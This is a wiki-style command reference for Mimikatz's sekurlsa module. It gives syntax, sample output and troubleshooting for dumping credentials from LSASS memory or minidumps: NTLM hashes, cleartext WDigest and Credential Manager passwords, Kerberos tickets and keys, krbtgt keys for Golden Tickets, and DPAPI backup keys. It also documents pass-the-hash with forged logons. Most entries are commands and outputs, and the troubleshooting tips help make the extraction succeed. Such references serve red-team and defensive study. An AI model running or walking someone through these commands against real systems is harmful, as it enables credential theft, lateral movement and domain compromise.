---
title: Mimikatz::Sekurlsa
description: Sekurlsa module command reference
published: true
date: 2025-10-09T02:25:58.277Z
tags: mimikatz
editor: markdown
dateCreated: 2025-10-08T15:16:31.914Z
---

# Mimikatz::Sekurlsa
Sekurlsa module command reference

## Overview
The sekurlsa module gathers credential material from a live LSASS process or an offline minidump by loading provider-specific parsers. Its command table exposes providers such as MSV, WDigest, Kerberos, CloudAP, TSPKG, SSP, DPAPI, and Credential Manager, as well as helper utilities for pass-the-hash, boot key management, and Kerberos ticket extraction.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L8-L154】

Before running provider commands, ensure the module is pointed at the correct data source:
- `sekurlsa::process` reinitializes the module so future commands read live LSASS memory.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L112-L116】
- `sekurlsa::minidump <path>` switches to an offline LSASS dump that you can analyze without touching the live process.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L119-L130】

Common acquisition failures affect every command. Watch for messages such as `LSASS process not found (?)`, architecture mismatches, or missing `SystemInfoStream`, and resolve them by running with administrative rights, matching your build/architecture, and supplying a complete minidump.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L156-L220】

Each section below summarizes syntax, use cases, sample output, and troubleshooting guidance.

### `sekurlsa::process`
- **Purpose:** Reset to the live LSASS handle after working with minidumps or remote sessions.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L112-L116】
- **Syntax:** `sekurlsa::process`
- **Example usage/output:**
  ```mimikatz
  mimikatz # sekurlsa::process
  Switch to PROCESS
  ```
- **Potential errors & fixes:** No specific errors are raised; if follow-up commands still reference the wrong source, confirm no lingering minidump path is set by re-running the command.

### `sekurlsa::minidump <path>`
- **Purpose:** Load credentials from an LSASS minidump instead of the live process.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L119-L130】
- **Syntax:** `sekurlsa::minidump C:\path\to\lsass.dmp`
- **Example usage/output:**
  ```mimikatz
  mimikatz # sekurlsa::minidump C:\temp\lsass.dmp
  Switch to MINIDUMP : 'C:\temp\lsass.dmp'
  ```
- **Potential errors & fixes:**
  - `<minidumpfile.dmp> argument is missing` appears when no file path is supplied; rerun with a valid path.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L121-L129】
  - `Minidump without SystemInfoStream (?)` indicates an incomplete dump—re-capture it with the `-ma` flag in `procdump` or similar tools.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L188-L207】
  - Architecture mismatch errors (e.g., `ProcessorArchitecture ... != ...`) require opening the dump with the same architecture build of mimikatz.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L195-L204】

### `sekurlsa::msv`
- **Purpose:** Enumerate MSV1_0 credentials (LM/NTLM hashes, SHA1 digests, DPAPI flags).【F:mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_msv1_0.c†L16-L118】
- **Syntax:** `sekurlsa::msv`
- **Example usage/output:**
  ```mimikatz
  mimikatz # sekurlsa::msv
  Authentication Id : 0 ; 123456 (00000000:0001E240)
  Package Name (NTLM only): NTLM
  UserName : CONTOSO\alice
  NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
  SHA1     : 11d6b0758fddba8861c378c2ffb437e6b92245c8
  ```
- **Potential errors & fixes:** Output lines such as `n.e. (KIWI_MSV1_0_CREDENTIALS KO)` or `kull_m_memory_copy` failures imply LSASS memory changed during reading; rerun quickly or capture a minidump for a stable snapshot.【F:mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_msv1_0.c†L72-L127】

### `sekurlsa::wdigest`
- **Purpose:** Dump cached clear-text WDigest credentials for each logon session.【F:mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_wdigest.c†L33-L70】
- **Syntax:** `sekurlsa::wdigest`
- **Example usage/output:**
  ```mimikatz
  mimikatz # sekurlsa::wdigest
  Authentication Id : 0 ; 24680 (00000000:000060A8)
  UserName : CONTOSO\bob
  Password : Sup3rSecret!
  ```
- **Potential errors & fixes:** If the command prints `KO`, the module could not locate the WDigest session list—ensure the target build still stores credentials (Windows 8.1/2012 R2 and later disable it by default) or use `sekurlsa::logonPasswords` to confirm availability.【F:mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_wdigest.c†L60-L70】

### `sekurlsa::kerberos`
- **Purpose:** Retrieve Kerberos primary credentials, including smart card PIN data on supported systems.【F:mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c†L346-L414】
- **Syntax:** `sekurlsa::kerberos`
- **Example usage/output:**
  ```mimikatz
  mimikatz # sekurlsa::kerberos
  Authentication Id : 0 ; 414141 (00000000:00065151)
  UserName : alice
  Domain   : CONTOSO.COM
  Password : (Kerberos keys, PIN, or smartcard data)
  ```
- **Potential errors & fixes:** Failures from `kull_m_memory_copy` during CSP or credential reads mean LSASS moved objects; retry immediately or fall back to an offline dump to avoid race conditions.【F:mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c†L391-L405】

### `sekurlsa::tspkg`
- **Purpose:** Extract Terminal Services single sign-on credentials from the TS global credential table.【F:mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_tspkg.c†L33-L68】
- **Syntax:** `sekurlsa::tspkg`
- **Example usage/output:**
  ```mimikatz
  mimikatz # sekurlsa::tspkg
  Authentication Id : 0 ; 4011 (00000000:00000FAB)
  UserName : CONTOSO\rduser
  Password : TS-Delegation-Password
  ```
- **Potential errors & fixes:** No dedicated error messages exist; if nothing appears, verify the session actually authenticated via TSPKG (typical on pre-Windows 10 builds or RDS scenarios).

### `sekurlsa::livessp`
- **Availability:** Disabled on ARM64 builds because LiveSSP is absent.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L13-L31】
- **Purpose:** Enumerate cached LiveSSP credentials when supported.【F:mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_livessp.c†L20-L51】
- **Syntax:** `sekurlsa::livessp`
- **Example usage/output:**
  ```mimikatz
  mimikatz # sekurlsa::livessp
  Authentication Id : 0 ; 98765 (00000000:000181CD)
  UserName : CONTOSO\service
  Password : (LiveSSP secret)
  ```
- **Potential errors & fixes:** If the command is unavailable, confirm you are running on x64 with LiveSSP present. Empty output may indicate no LiveSSP logons occurred; use `sekurlsa::logonPasswords` to verify sessions.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L13-L31】

### `sekurlsa::cloudap`
- **Purpose:** Display Azure AD PRT data, session keys, and key identifiers for the active user.【F:mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_cloudap.c†L20-L119】
- **Syntax:** `sekurlsa::cloudap`
- **Example usage/output:**
  ```mimikatz
  mimikatz # sekurlsa::cloudap
  Authentication Id : 0 ; 2222 (00000000:000008AE)
  UserName : alice@contoso.com
  Primary Refresh Token : eyJ0eXAiOiJKV1Qi...
  Device Key : {GUID}
  ```
- **Potential errors & fixes:** If the command prints `KO`, the pattern search failed—confirm CloudAP is present on the target build and rerun after an interactive Azure AD login so cache structures exist. When nothing outputs, the account may not have a PRT cached yet.【F:mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_cloudap.c†L24-L119】

### `sekurlsa::ssp`
- **Purpose:** List credentials held by third-party Security Support Providers integrated with MSV.【F:mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_ssp.c†L33-L66】
- **Syntax:** `sekurlsa::ssp`
- **Example usage/output:**
  ```mimikatz
  mimikatz # sekurlsa::ssp
  Authentication Id : 0 ; 1999 (00000000:000007CF)
  Package : CustomSSP
  UserName : CONTOSO\svc_account
  Password : (decrypted secret)
  ```
- **Potential errors & fixes:** Empty sections usually mean no SSPs are registered. If `kull_m_memory_copy` fails mid-enumeration, retry quickly or switch to an offline dump to stabilize the structures.【F:mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_ssp.c†L46-L64】

### `sekurlsa::logonPasswords`
- **Purpose:** Aggregate the output of every registered sekurlsa provider for all logon sessions.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L151-L154】
- **Syntax:** `sekurlsa::logonPasswords`
- **Example usage/output:**
  ```mimikatz
  mimikatz # sekurlsa::logonPasswords
  Authentication Id : 0 ; 123456
  msv : ...
  tspkg : ...
  wdigest : ...
  kerberos : ...
  ```
- **Potential errors & fixes:** Because this loops through all providers, any failure mentioned in individual sections may surface here. Re-run after resolving underlying provider issues (e.g., architecture mismatches or missing packages).

### `sekurlsa::bootkey`
- **Purpose:** Manage the Secure Kernel boot key cache to support isolated credential decryption.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_sk.c†L155-L210】
- **Syntax:**
  - `sekurlsa::bootkey /flush`
  - `sekurlsa::bootkey /new:<32-byte-hex>`
  - `sekurlsa::bootkey /raw:C:\dumps\memory.bin`
  
   **Flags:**
  * `/flush` — Clears cached candidate keys and resets the current `IumMkPerBoot` value, which you should do when a previous attempt populated the cache with stale data.【F:mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_sk.c†L155-L161】
  * `/new:<hex>` — Injects a new 32-byte boot key (hex-encoded) and clears the cache so subsequent decryptions use the supplied value; use this when you already recovered the correct boot key from another source.【F:mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_sk.c†L162-L170】
  * `/raw:<path>` — Scans a raw memory image or dump for additional boot key candidates, automatically appending any finds to the cache; handy when you captured RAM separately and need more key guesses.【F:mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_sk.c†L173-L185】

  
- **Example usage/output:**
  ```mimikatz
  mimikatz # sekurlsa::bootkey /raw:C:\dumps\ram.bin
    > SecureKernel stream found in minidump (32768 bytes)
    4 candidate keys found
  mimikatz # sekurlsa::bootkey /flush
  ```
- **Potential errors & fixes:** `No key?` indicates the tool could not read or parse key material—verify the raw file path and permissions.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_sk.c†L155-L210】 `SkpEncryptionWorker(decrypt)` errors mean the candidate key failed; supply a different key or re-run `/raw` against a higher quality memory capture.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_sk.c†L195-L210】

### `sekurlsa::pth`
- **Purpose:** Perform pass-the-hash/key on an existing or new logon session and optionally impersonate the resulting token.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L883-L1005】
- **Syntax:**
  ```
  sekurlsa::pth /user:<name> /domain:<fqdn> /ntlm:<hash> [/aes128:<hex>] [/aes256:<hex>] [/run:<program>] [/impersonate] [/luid:<value>]
  ```
  * **Flags/arguments:**
  * `/luid:<value>` — Target an existing logon session by LUID; use this when you know the session you want to modify and do not want to spawn a new process.【F:mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L894-L961】
  * `/user:<name>` and `/domain:<name>` — Required together when you want to create a new net-only logon that will be patched; without them, the command warns about missing arguments.【F:mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L901-L915】
  * `/run:<program>` — Overrides the default program (`cmd.exe`) that is launched for a new logon, letting you start a specific tool under the forged credentials.【F:mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L905-L909】
  * `/impersonate` — After patching a net-only logon, duplicates the token and impersonates it on the current thread, which is useful for pivoting without launching a new process.【F:mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L905-L988】
  * `/ntlm:<hash>` or `/rc4:<hash>` — Supplies the 16-byte NTLM hash (RC4 key) to inject; mandatory unless you provide AES keys, because at least one credential material must be replaced.【F:mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L946-L1002】
  * `/aes128:<hex>` — Inserts a 128-bit Kerberos key. Only works on Windows 7/2008 R2 and later where AES session keys are supported; use this when targeting Kerberos authentication that relies on AES keys.【F:mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L918-L932】
  * `/aes256:<hex>` — Inserts a 256-bit Kerberos key. Like `/aes128`, it is restricted to modern builds (Windows 8.1 / KB2871997 or later) and is necessary when the target service demands AES-256 tickets.【F:mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L932-L944】

  
- **Example usage/output:**
  ```mimikatz
  mimikatz # sekurlsa::pth /user:alice /domain:CONTOSO /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:powershell.exe
  user    : alice
  domain  : CONTOSO
  program : powershell.exe
  netonly : OK
  ```
- **Potential errors & fixes:**
  - Missing `/user` or `/domain` arguments trigger warnings when creating net-only logons—supply both parameters.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L901-L915】
  - `kull_m_memory_copy` failures during hash injection imply LSASS memory shifted; retry quickly or elevate privileges.【F:mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_msv1_0.c†L72-L127】
  - AES options require Windows 7/2008 R2+ (for `/aes128`) or KB2871997/Windows 8.1+ (for `/aes256`); on older builds the helper skips AES injection, so rely on NTLM instead.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L918-L944】

### `sekurlsa::krbtgt`
- **Availability:** Disabled on ARM64 builds.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L24-L26】
- **Purpose:** Dump current and previous krbtgt keys from the KDC for Golden Ticket operations.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L471-L489】
- **Syntax:** `sekurlsa::krbtgt`
- **Example usage/output:**
  ```mimikatz
  mimikatz # sekurlsa::krbtgt
  Current Key : aes256_hmac       32 b : c4d3...
  Previous Key: rc4_hmac_old      16 b : 8846...
  ```
- **Potential errors & fixes:** Empty output often means you are not on a domain controller. Confirm LSASS belongs to a DC and that you are running as SYSTEM. If the command is missing entirely, ensure you are not on ARM64.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L24-L26】【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L471-L489】

### `sekurlsa::dpapisystem`
- **Purpose:** Recover DPAPI_SYSTEM secrets (machine/user SHA1 components) for decrypting system-protected blobs.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L629-L682】
- **Syntax:** `sekurlsa::dpapisystem`
- **Example usage/output:**
  ```mimikatz
  mimikatz # sekurlsa::dpapisystem
  Machine key : 35d1e4a16a7e8e0c2932...
  User key    : 128b0f9ad98f8a1a47fe...
  ```
- **Potential errors & fixes:** Lack of output indicates the DPAPI service has not cached secrets yet—trigger DPAPI use (e.g., Credential Manager access) and rerun. Generic LSASS access errors can be mitigated by elevating privileges or analyzing an offline dump.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L629-L682】

### `sekurlsa::trust`
- **Availability:** Compiled only on x64/ARM64 builds because it reads KDC trust lists absent on 32-bit systems.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L28-L31】【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L685-L719】
- **Purpose:** Enumerate KDC domain trust objects, including trust keys and metadata.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L694-L719】
- **Syntax:** `sekurlsa::trust`
- **Example usage/output:**
  ```mimikatz
  mimikatz # sekurlsa::trust
  Domain Trust : CONTOSO.COM -> FABRIKAM.COM
    Type       : Cross-forest
    Incoming   : aes256_hmac 32 b : a1b2...
    Outgoing   : rc4_hmac    16 b : c3d4...
  ```
- **Potential errors & fixes:** Running on a non-DC host yields no trust entries—target a domain controller. If the command is unavailable, switch to an x64 build.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L28-L31】

### `sekurlsa::backupkeys`
- **Availability:** x64/ARM64 only (same guard as `trust`).【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L28-L31】
- **Purpose:** Retrieve preferred and legacy DPAPI backup keys used to decrypt DPAPI master keys.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L820-L877】
- **Syntax:**
  - `sekurlsa::backupkeys`
  - `sekurlsa::backupkeys /export`
  
  * **Flags:**
  * `/export` — Passes an export flag into the analyzer so that recovered backup keys are written out, which you need when you want `.pvk`/`.der` output for later DPAPI master key recovery.【F:mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L862-L877】

  
- **Example usage/output:**
  ```mimikatz
  mimikatz # sekurlsa::backupkeys /export
  DPAPI Backup Keys :
    * Preferred : {GUID} (exported to 20240101-120000-preferred.pvk)
    * Legacy    : {GUID} (exported to 20240101-120000-legacy.pvk)
  ```
- **Potential errors & fixes:** If nothing exports, ensure you supplied `/export`; otherwise, only in-memory details are shown.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L862-L877】 A `Pattern not found in DPAPI service` error means the DPAPI module offsets were not located—verify the target build is supported and rerun after switching to a matching architecture build.【F:mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c†L796-L837】

### `sekurlsa::tickets`
- **Purpose:** List Kerberos tickets per logon session and optionally export them to `.kirbi` files.【F:mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c†L360-L465】
- **Syntax:**
  - `sekurlsa::tickets`
  - `sekurlsa::tickets /export`
  
* **Flags:**
  * `/export` — Any argument toggles the export flag (the implementation simply checks whether arguments exist), so using `/export` or similar causes each ticket to be saved to a file. Use it when you plan to replay tickets with other tools or need them for offline analysis.【F:mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c†L360-L365】【F:mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c†L451-L463】
  
- **Example usage/output:**
  ```mimikatz
  mimikatz # sekurlsa::tickets /export
  * PAC : yes
  * ServiceName : krbtgt/CONTOSO.COM @ CONTOSO.COM
    -> Ticket : 0 ; 0 - 0x00000000 : C:\temp\krbtgt.kirbi
  ```
- **Potential errors & fixes:** `kull_m_file_writeData` errors indicate the export directory is unwritable—change to a writable folder or run as administrator.【F:mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c†L659-L661】 If tickets do not appear, ensure the account has active Kerberos sessions.

### `sekurlsa::ekeys`
- **Purpose:** Dump Kerberos key lists (NTLM, AES, etc.) for each logon session.【F:mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c†L368-L454】
- **Syntax:** `sekurlsa::ekeys`
- **Example usage/output:**
  ```mimikatz
  mimikatz # sekurlsa::ekeys
  LogonId  : 0 ; 999 (00000000:000003E7)
  * Key List :
    > aes256_hmac (32b) : c1d2...
    > rc4_hmac    (16b) : e3f4...
  ```
- **Potential errors & fixes:** Errors from `kull_m_memory_copy` when reading key lists mean LSASS modified memory; retry quickly or switch to a minidump for consistent data.【F:mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c†L440-L454】

### `sekurlsa::dpapi`
- **Purpose:** Enumerate cached DPAPI master keys for local logon sessions and reveal raw keys/SHA1 hashes.【F:mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_dpapi.c†L43-L103】
- **Syntax:** `sekurlsa::dpapi`
- **Example usage/output:**
  ```mimikatz
  mimikatz # sekurlsa::dpapi
  Authentication Id : 0 ; 5555 (00000000:000015B3)
  MasterKey : {GUID}
  Key       : 4d9f...
  Sha1      : 5e6a...
  ```
- **Potential errors & fixes:** Missing entries mean the user has no cached master keys; trigger DPAPI usage (e.g., open Credential Manager) and try again. Memory copy failures suggest using a minidump to stabilize structures.【F:mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_dpapi.c†L57-L103】

### `sekurlsa::credman`
- **Purpose:** Reveal saved Credential Manager secrets per logon session, including decrypted passwords when available.【F:mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_credman.c†L8-L93】
- **Syntax:** `sekurlsa::credman`
- **Example usage/output:**
  ```mimikatz
  mimikatz # sekurlsa::credman
  Authentication Id : 0 ; 7777 (00000000:00001E61)
  Target : MicrosoftAccount:user=alice@contoso.com
  User   : alice@contoso.com
  Password : P@ssw0rd!
  ```
- **Potential errors & fixes:** If nothing appears, the user may not store Credential Manager entries. `kull_m_memory_copy` warnings point to racing LSASS memory; capture a minidump or rerun immediately.【F:mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_credman.c†L44-L89】
